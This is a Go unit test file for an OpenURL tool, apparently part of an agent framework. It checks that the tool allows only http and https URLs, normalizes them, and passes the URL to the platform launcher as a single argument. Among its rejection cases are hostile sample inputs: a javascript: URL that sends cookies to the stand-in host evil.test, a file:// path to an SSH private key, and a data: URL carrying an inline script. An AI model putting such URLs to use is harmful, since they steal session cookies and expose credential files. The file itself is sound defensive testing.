package tools

import (
	"context"
	"encoding/json"
	"strings"
	"testing"
)

// Every case here must stop before Execute reaches exec.Start: a test run may
// not open a browser on the machine it runs on.
func TestOpenURLRejectsEverythingButHTTP(t *testing.T) {
	for _, testCase := range []struct {
		name string
		url  string
		want string
	}{
		{name: "empty", url: "   ", want: "url is required"},
		{name: "local file", url: "file:///C:/Users/me/.ssh/id_rsa", want: "only http and https"},
		{name: "script", url: "javascript:fetch('http://evil.test/'+document.cookie)", want: "only http and https"},
		{name: "inline payload", url: "data:text/html,<script>alert(1)</script>", want: "only http and https"},
		{name: "registered application", url: "ms-settings:windowsupdate", want: "only http and https"},
		{name: "no host", url: "http://", want: "must include a host"},
		{name: "control character", url: "https://example.com/\x00", want: "control character"},
		{name: "too long", url: "https://example.com/" + strings.Repeat("a", openURLMaxLength), want: "maximum"},
	} {
		t.Run(testCase.name, func(t *testing.T) {
			if _, err := validateOpenURL(testCase.url); err == nil || !strings.Contains(err.Error(), testCase.want) {
				t.Fatalf("expected %q to be rejected with %q, got %v", testCase.url, testCase.want, err)
			}
			input, _ := json.Marshal(openURLInput{URL: testCase.url})
			result, err := (OpenURLTool{}).Execute(context.Background(), Call{ID: "open", Name: "OpenURL", Input: input}, Env{})
			if err != nil {
				t.Fatal(err)
			}
			if !result.IsError {
				t.Fatalf("expected %q to fail before launching anything, got %+v", testCase.url, result)
			}
		})
	}
}

func TestOpenURLNormalizesAcceptedURLs(t *testing.T) {
	for _, testCase := range []struct{ in, want string }{
		{in: "  https://www.youtube.com/watch?v=abc&t=1  ", want: "https://www.youtube.com/watch?v=abc&t=1"},
		{in: "HTTP://Example.com/a b", want: "http://Example.com/a%20b"},
		{in: "https://example.com/#frag", want: "https://example.com/#frag"},
	} {
		got, err := validateOpenURL(testCase.in)
		if err != nil {
			t.Fatalf("%q: %v", testCase.in, err)
		}
		if got != testCase.want {
			t.Fatalf("%q normalized to %q, want %q", testCase.in, got, testCase.want)
		}
	}
}

// The URL is one argv entry on every platform, so an ampersand or a query
// string cannot be read as shell syntax the way it is under `cmd /c start`.
func TestOpenURLLaunchArgsPerPlatform(t *testing.T) {
	target := "https://www.youtube.com/watch?v=abc&t=1"
	for _, testCase := range []struct {
		goos string
		name string
		args []string
	}{
		{goos: "windows", name: "rundll32", args: []string{"url.dll,FileProtocolHandler", target}},
		{goos: "darwin", name: "open", args: []string{target}},
		{goos: "linux", name: "xdg-open", args: []string{target}},
	} {
		name, args := openURLLaunchArgs(testCase.goos, target)
		if name != testCase.name {
			t.Fatalf("%s launcher is %q, want %q", testCase.goos, name, testCase.name)
		}
		if len(args) != len(testCase.args) {
			t.Fatalf("%s args %v, want %v", testCase.goos, args, testCase.args)
		}
		for index := range args {
			if args[index] != testCase.args[index] {
				t.Fatalf("%s arg %d is %q, want %q", testCase.goos, index, args[index], testCase.args[index])
			}
		}
	}
}

func TestOpenURLIsRegisteredAsAnExecTool(t *testing.T) {
	registry := NewRegistry()
	RegisterCore(registry)
	tool, err := registry.MustGet("OpenURL")
	if err != nil {
		t.Fatal(err)
	}
	if got := tool.Risk(nil); got != RiskExec {
		t.Fatalf("OpenURL risk is %q, want %q", got, RiskExec)
	}
}
